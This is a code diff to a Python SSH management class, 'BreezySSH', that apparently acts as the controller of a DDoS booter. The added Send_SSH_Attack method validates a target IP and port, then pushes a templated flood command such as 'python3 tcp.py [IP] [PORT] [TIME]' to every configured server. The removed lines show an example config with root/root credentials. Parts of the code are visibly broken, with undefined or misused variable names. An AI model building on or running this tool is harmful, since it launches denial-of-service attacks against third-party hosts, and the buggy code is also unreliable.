@@ -1,5 +1,8 @@
 import json, paramiko
 
+from ..utils import *
+from ..classes import Attack
+
 class SSH_M():
     name:           str;            # "Server1"
     host_ip:        str;            # "5.5.5.5"
@@ -16,19 +19,7 @@ class BreezySSH():
         self.__parseMethods(ssh_m);
 
     """
-        using 'jsonfile2dict() -> dict:'
-
-{
-      “Server1”: {
-            “host_ip”: “5.5.5.5”,
-            “host_port”: 22,
-            “username”: “root”,
-            “password”: “root”,
-            “methods”: {
-                  “tcp”: “python3 tcp.py [IP] [PORT] [TIME]”
-              }
-      }
-}
+        Parse JSON/Dict to ensure the correct fields, keys, and values
     """
     def __parseMethods(self, methods: dict) -> bool:
         try:
@@ -59,15 +50,6 @@ class BreezySSH():
                 
         return True;
 
-    """
-        Detecting script paths to ensure all servers have the method listed in config!
-
-        NOT DONE 57/14/23 9PM EST 
-    """
-    def __detectFiles(self) -> bool:
-        for ssh in self.methods:
-            ssh_check, ssh_stdin = self.sendCmd(ssh, "/root/methods/"); 
-
     def sendCmd(self, ssh: SSH_M, cmd: str) -> tuple[bool, str]:
         try:
             server = paramiko.client.SSHClient();
@@ -79,3 +61,17 @@ class BreezySSH():
         except:
             print(f"[ X ] Error, Unable to connect to {ssh_server.host_ip}....!");
             return False, "";
+
+    def Send_SSH_Attack(self, ip: str, p: str, t: str, m: str) -> bool:
+        if not validateIPV4(ip): return False;
+        if not validateAttackPort(p): return False;
+
+        for ssh in ssh.methods:
+            if f"{m}" in ssh.methods:
+                fix_usage = parse_usage(ssh.methods[f'{m}'], Attack(ip, p, t, m));
+                try: self.sendCmd(ssh, fix_usage);
+                except:
+                    print(f"[ X ] Error, Unable to send attack command to {ssh.host_ip}....!");
+                    return False;
+
+        return True;
